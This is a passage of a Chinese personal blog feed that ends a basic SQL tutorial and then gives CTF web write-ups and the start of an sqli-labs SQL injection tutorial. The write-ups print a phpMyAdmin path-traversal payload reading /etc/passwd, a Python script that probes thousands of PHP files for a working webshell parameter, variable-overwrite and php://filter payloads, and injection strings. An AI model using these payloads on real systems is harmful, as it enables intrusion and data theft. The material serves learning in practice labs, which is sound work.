class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"><span class="comment">-- 可以给表设置别名</span></span><br></pre></td></tr></table></figure><p>这种一次查询两个表的数据，查询的结果也是一个二维表，它是students表和classes表的“乘积”，即students表的每一行与classes表的每一行都两两拼在一起返回。结果集的列数是students表和classes表的列数之和，行数是students表和classes表的行数之积。</p><h3 id="连接查询"><a href="#连接查询" class="headerlink" title="连接查询"></a>连接查询</h3><p>JOIN查询需要先确定主表，然后把另一个表的数据“附加”到结果集上</p><p>INNER JOIN是最常用的一种JOIN查询，它的语法是SELECT … FROM &lt;表1&gt; INNER JOIN &lt;表2&gt; ON &lt;条件…&gt;；</p><p>JOIN查询仍然可以使用WHERE条件和ORDER BY排序。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 内连接 <span class="keyword">INNER</span> <span class="keyword">JOIN</span></span><br><span class="line"><span class="keyword">SELECT</span> s.id, s.name, s.class_id, c.name class_name, s.gender, s.score</span><br><span class="line"><span class="keyword">FROM</span> students s</span><br><span class="line"><span class="keyword">INNER</span> <span class="keyword">JOIN</span> classes c</span><br><span class="line"><span class="keyword">ON</span> s.class_id <span class="operator">=</span> c.id;</span><br><span class="line"></span><br><span class="line"># 外连接<span class="keyword">OUTER</span> <span class="keyword">JOIN</span></span><br><span class="line"><span class="keyword">SELECT</span> s.id, s.name, s.class_id, c.name class_name, s.gender, s.score</span><br><span class="line"><span class="keyword">FROM</span> students s</span><br><span class="line"><span class="keyword">RIGHT</span> <span class="keyword">OUTER</span> <span class="keyword">JOIN</span> classes c</span><br><span class="line"><span class="keyword">ON</span> s.class_id <span class="operator">=</span> c.id;</span><br></pre></td></tr></table></figure><p>INNER JOIN只返回同时存在于两张表的行数据，由于students表的class_id包含1，2，3，classes表的id包含1，2，3，4，所以，INNER JOIN根据条件s.class_id = c.id返回的结果集仅包含1，2，3</p><p>RIGHT OUTER JOIN返回右表都存在的行。如果某一行仅在右表存在，那么结果集就会以NULL填充剩下的字段</p><p>LEFT OUTER JOIN则返回左表都存在的行。如果我们给students表增加一行，并添加class_id=5，由于classes表并不存在id=5的行，所以，LEFT OUTER JOIN的结果会增加一行，对应的class_name是NULL</p><p>FULL OUTER JOIN，它会把两张表的所有记录全部选择出来，并且，自动把对方不存在的列填充为NULL</p><p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20220118133003.png"></p><h2 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h2><h3 id="INSERT"><a href="#INSERT" class="headerlink" title="INSERT"></a>INSERT</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span> (字段<span class="number">1</span>, 字段<span class="number">2</span>, ...) <span class="keyword">VALUES</span> (值<span class="number">1</span>, 值<span class="number">2</span>, ...);</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> students (class_id, name, gender, score) <span class="keyword">VALUES</span></span><br><span class="line">(<span class="number">1</span>, <span class="string">&#x27;大宝&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="number">87</span>), </span><br><span class="line">(<span class="number">2</span>, <span class="string">&#x27;大牛&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="number">80</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>字段顺序不必和数据库表的字段顺序一致，但值的顺序必须和字段顺序一致</p><h3 id="UPDATE"><a href="#UPDATE" class="headerlink" title="UPDATE"></a>UPDATE</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">UPDATE <span class="operator">&lt;</span>表名<span class="operator">&gt;</span> <span class="keyword">SET</span> 字段<span class="number">1</span><span class="operator">=</span>值<span class="number">1</span>, 字段<span class="number">2</span><span class="operator">=</span>值<span class="number">2</span>, ... <span class="keyword">WHERE</span> ...;</span><br><span class="line"></span><br><span class="line">UPDATE students <span class="keyword">SET</span> name<span class="operator">=</span><span class="string">&#x27;大牛&#x27;</span>, score<span class="operator">=</span><span class="number">66</span> <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">UPDATE students <span class="keyword">SET</span> score<span class="operator">=</span>score<span class="operator">+</span><span class="number">10</span> <span class="keyword">WHERE</span> score<span class="operator">&lt;</span><span class="number">80</span>; <span class="comment">--更新时可使用表达式</span></span><br></pre></td></tr></table></figure><p>在执行UPDATE语句时要非常小心，最好先用SELECT语句来测试WHERE条件是否筛选出了期望的记录集，然后再用UPDATE更新。</p><h3 id="DELETE"><a href="#DELETE" class="headerlink" title="DELETE"></a>DELETE</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span> <span class="keyword">WHERE</span> ...;</span><br></pre></td></tr></table></figure><p>在执行DELETE语句时也要非常小心，最好先用SELECT语句来测试WHERE条件是否筛选出了期望的记录集，然后再用DELETE删除。</p><h2 id="管理"><a href="#管理" class="headerlink" title="管理"></a>管理</h2><h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE test; <span class="comment">-- 创建数据库</span></span><br><span class="line"><span class="keyword">DROP</span> DATABASE test； <span class="comment">-- 删除数据库</span></span><br><span class="line">USE test; <span class="comment">-- 切换数据库</span></span><br></pre></td></tr></table></figure><h3 id="表"><a href="#表" class="headerlink" title="表"></a>表</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> TABLES;</span><br><span class="line"><span class="keyword">DESC</span> students; <span class="comment">-- 查看表结构</span></span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> students; <span class="comment">-- 查看创建表sql</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> test; <span class="comment">-- 创建</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> students; <span class="comment">-- 删除</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> students <span class="keyword">ADD</span> <span class="keyword">COLUMN</span> birth <span class="type">VARCHAR</span>(<span class="number">10</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>; <span class="comment">-- 添加列</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> students CHANGE <span class="keyword">COLUMN</span> birth birthday <span class="type">VARCHAR</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>; <span class="comment">-- 更改列名</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> students <span class="keyword">DROP</span> <span class="keyword">COLUMN</span> birthday; <span class="comment">-- 删除列</span></span><br></pre></td></tr></table></figure><h2 id="实用sql语句"><a href="#实用sql语句" class="headerlink" title="实用sql语句"></a>实用sql语句</h2><h3 id="插入或替换"><a href="#插入或替换" class="headerlink" title="插入或替换"></a>插入或替换</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE <span class="keyword">INTO</span> students (id, class_id, name, gender, score) <span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="number">1</span>, <span class="string">&#x27;小明&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="number">99</span>);</span><br></pre></td></tr></table></figure><p>若id=1的记录不存在，REPLACE语句将插入新记录，否则，当前id=1的记录将被删除，然后再插入新记录。</p><h3 id="插入或更新"><a href="#插入或更新" class="headerlink" title="插入或更新"></a>插入或更新</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> students (id, class_id, name, gender, score) <span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="number">1</span>, <span class="string">&#x27;小明&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="number">99</span>) <span class="keyword">ON</span> DUPLICATE KEY UPDATE name<span class="operator">=</span><span class="string">&#x27;小明&#x27;</span>, gender<span class="operator">=</span><span class="string">&#x27;F&#x27;</span>, score<span class="operator">=</span><span class="number">99</span>;</span><br></pre></td></tr></table></figure><p>若id=1的记录不存在，INSERT语句将插入新记录，否则，当前id=1的记录将被更新，更新的字段由UPDATE指定。</p><h3 id="插入或忽略"><a href="#插入或忽略" class="headerlink" title="插入或忽略"></a>插入或忽略</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> IGNORE <span class="keyword">INTO</span> students (id, class_id, name, gender, score) <span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="number">1</span>, <span class="string">&#x27;小明&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="number">99</span>);</span><br></pre></td></tr></table></figure><p>若id=1的记录不存在，INSERT语句将插入新记录，否则，不执行任何操作。</p><h3 id="快照"><a href="#快照" class="headerlink" title="快照"></a>快照</h3><p>copy 一个表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> students_of_class1 <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> students <span class="keyword">WHERE</span> class_id<span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure><h3 id="写入查询结果集"><a href="#写入查询结果集" class="headerlink" title="写入查询结果集"></a>写入查询结果集</h3><p>如果查询结果集需要写入到表中，可以结合INSERT和SELECT，将SELECT语句的结果集直接插入到指定表中。</p><p>先创表，再写入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> statistics (</span><br><span class="line">    id <span class="type">BIGINT</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT,</span><br><span class="line">    class_id <span class="type">BIGINT</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">    average <span class="keyword">DOUBLE</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">    <span class="keyword">PRIMARY</span> KEY (id)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> statistics (class_id, average) <span class="keyword">SELECT</span> class_id, <span class="built_in">AVG</span>(score) <span class="keyword">FROM</span> students <span class="keyword">GROUP</span> <span class="keyword">BY</span> class_id;</span><br></pre></td></tr></table></figure><h3 id="强制使用指定索引"><a href="#强制使用指定索引" class="headerlink" title="强制使用指定索引"></a>强制使用指定索引</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> students FORCE INDEX (idx_class_id) <span class="keyword">WHERE</span> class_id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> id <span class="keyword">DESC</span>;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;配置数据库环境&quot;&gt;&lt;a href=&quot;#配置数据库环境&quot; class=&quot;headerlink&quot; title=&quot;配置数据库环境&quot;&gt;&lt;/a&gt;配置数据库环境&lt;/h2&gt;&lt;p&gt;建议直接买个云mysql服务器，本地配置太折磨人了&lt;/p&gt;
&lt;h2 id=&quot;常用命令&quot;&gt;&lt;a hre</summary>
      
    
    
    
    <category term="开发工具" scheme="http://blog.haorical.top/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="sql" scheme="http://blog.haorical.top/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>20220101</title>
    <link href="http://blog.haorical.top/posts/c3e022b4/"/>
    <id>http://blog.haorical.top/posts/c3e022b4/</id>
    <published>2022-01-01T08:39:48.000Z</published>
    <updated>2022-01-17T07:15:08.252Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>20211129</title>
    <link href="http://blog.haorical.top/posts/11d5b1/"/>
    <id>http://blog.haorical.top/posts/11d5b1/</id>
    <published>2021-11-29T02:56:30.000Z</published>
    <updated>2021-11-29T16:27:30.442Z</updated>
    
    <content type="html"><![CDATA[<h2 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2><blockquote><p>phpmyadmin 4.8 cve 文件包含漏洞</p></blockquote><pre><code>?target=db_sql.php%253f/../../../../../../etc/passwd</code></pre><h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p>学到了请求有get改成post</p><p>点击help，发现报错，把get改为post，同时改后面参数，改成post上去</p><pre><code>com.wm.ctf.DownloadController.doPost(DownloadController.java:24)</code></pre><p>得到一个奇怪的包的目录</p><p>看了下wp，java项目源码在WEB-INF中，构造pyload</p><p>params需要加个filename=WEB-INF/classes/com/wm/ctf/FlagController.class 同时post filename就可以把class下下来</p><h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><p>把源码下下来，一共好几千个文件里面有我们需要的马，我们只需要一个一个试即可🥰</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">print(<span class="string">&#x27;开始时间：  &#x27;</span>+  time.asctime( time.localtime(time.time()) ))</span><br><span class="line">s1=threading.Semaphore(<span class="number">100</span>)    <span class="comment">#这儿设置最大的线程数</span></span><br><span class="line">filePath = <span class="string">r&quot;C:\Users\haodo\Desktop\20211129\高明黑客\src&quot;</span></span><br><span class="line">os.chdir(filePath)<span class="comment">#改变当前的路径</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span><span class="comment">#设置重连次数，防止线程数过高，断开连接</span></span><br><span class="line">files = os.listdir(filePath)</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = <span class="literal">False</span> <span class="comment"># 设置连接活跃状态为False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_content</span>(<span class="params">file</span>):</span></span><br><span class="line">    s1.acquire()</span><br><span class="line">    print(<span class="string">&#x27;trying   &#x27;</span>+file+ <span class="string">&#x27;     &#x27;</span>+ time.asctime( time.localtime(time.time()) ))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:<span class="comment">#打开php文件，提取所有的$_GET和$_POST的参数</span></span><br><span class="line">            gets = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">            posts = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">    data = &#123;&#125;<span class="comment">#所有的$_POST</span></span><br><span class="line">    params = &#123;&#125;<span class="comment">#所有的$_GET</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> gets:</span><br><span class="line">        params[m] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> posts:</span><br><span class="line">        data[n] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    url = <span class="string">&#x27;http://fab0ef41-82a7-480e-a354-be549de9731f.node4.buuoj.cn:81/&#x27;</span>+file</span><br><span class="line">    req = session.post(url, data=data, params=params)<span class="comment">#一次性请求所有的GET和POST</span></span><br><span class="line">    req.close()<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">    req.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    content = req.text</span><br><span class="line">    <span class="comment">#print(content)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:<span class="comment">#如果发现有可以利用的参数，继续筛选出具体的参数</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> gets:</span><br><span class="line">            req = session.get(url+<span class="string">&#x27;?%s=&#x27;</span>%a+<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                exit(<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> posts:</span><br><span class="line">                req = session.post(url, data=&#123;b:<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:<span class="comment">#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span></span><br><span class="line">            param = a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param = b</span><br><span class="line">        print(<span class="string">&#x27;找到了利用文件： &#x27;</span>+file+<span class="string">&quot;  and 找到了利用的参数：%s&quot;</span> %param)</span><br><span class="line">        print(<span class="string">&#x27;结束时间：  &#x27;</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files:<span class="comment">#加入多线程</span></span><br><span class="line">   t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">   t.start()</span><br></pre></td></tr></table></figure><p>需要先本地测试，找到马后直接服务器利用即可</p><h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>变量覆盖漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>好多payload:</p><pre><code>yds=flagis=flag&amp;flag=flag</code></pre><h2 id="Had-a-bad-day"><a href="#Had-a-bad-day" class="headerlink" title="Had a bad day"></a>Had a bad day</h2><p>php://filter应用</p><p><a href="https://oatmeal.vip/security/web-learning/php-filter/">https://oatmeal.vip/security/web-learning/php-filter/</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span>( strpos( <span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))</span><br><span class="line"><span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br></pre></td></tr></table></figure><p>构造:</p><pre><code>php://filter/convert.base64-encode/write=woofers/resource=flag</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;GWCTF-2019-我有一个数据库&quot;&gt;&lt;a href=&quot;#GWCTF-2019-我有一个数据库&quot; class=&quot;headerlink&quot; title=&quot;[GWCTF 2019]我有一个数据库&quot;&gt;&lt;/a&gt;[GWCTF 2019]我有一个数据库&lt;/h2&gt;&lt;blockq</summary>
      
    
    
    
    <category term="ctf每日一题" scheme="http://blog.haorical.top/categories/ctf%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"/>
    
    
    <category term="ctf" scheme="http://blog.haorical.top/tags/ctf/"/>
    
    <category term="web" scheme="http://blog.haorical.top/tags/web/"/>
    
    <category term="代码审计" scheme="http://blog.haorical.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="文件包含" scheme="http://blog.haorical.top/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs速通</title>
    <link href="http://blog.haorical.top/posts/dc361564/"/>
    <id>http://blog.haorical.top/posts/dc361564/</id>
    <published>2021-11-21T14:54:08.000Z</published>
    <updated>2021-11-22T07:10:37.124Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>用docker把靶场安装在了虚拟机上，跟着天书走一遍，希望有所收获，不得不说docker和ssh真香，计划一部分一部分写，今天光做个报错注入已经弄了2个小时了。。</p></blockquote><span id="more"></span><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><h3 id="注入分类"><a href="#注入分类" class="headerlink" title="注入分类"></a>注入分类</h3><ol><li><p>基于错误</p></li><li><p>联合查询</p></li><li><p>堆查询</p></li><li><p>盲注（布尔/时间/报错）</p></li><li><p>处理输入</p></li><li><p>程序和顺序（一阶/二阶）</p></li><li><p>注入点位置</p></li></ol><h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">系统函数</span><br><span class="line">version() 数据库版本</span><br><span class="line"><span class="keyword">user</span>() 用户名</span><br><span class="line">database() 库名</span><br><span class="line">@<span class="variable">@datadir</span> 数据库路径</span><br><span class="line">@<span class="variable">@version</span>_compile_os 操作系统版本</span><br><span class="line"></span><br><span class="line">字符串连接</span><br><span class="line">concat() 无分隔符连接</span><br><span class="line">concat_ws(separator,str1,str2,...) 有分隔符</span><br><span class="line">group_concat(str1,str2,..) 连接</span><br><span class="line"></span><br><span class="line">一般替换（<span class="comment">--+可替换为# %23）</span></span><br><span class="line"><span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">--+</span></span><br><span class="line"><span class="string">&#x27;or 1=1--+</span></span><br><span class="line"><span class="string">&quot;or 1=1--+</span></span><br><span class="line"><span class="string">)or 1=1--+</span></span><br><span class="line"><span class="string">&#x27;</span>)<span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">--+</span></span><br><span 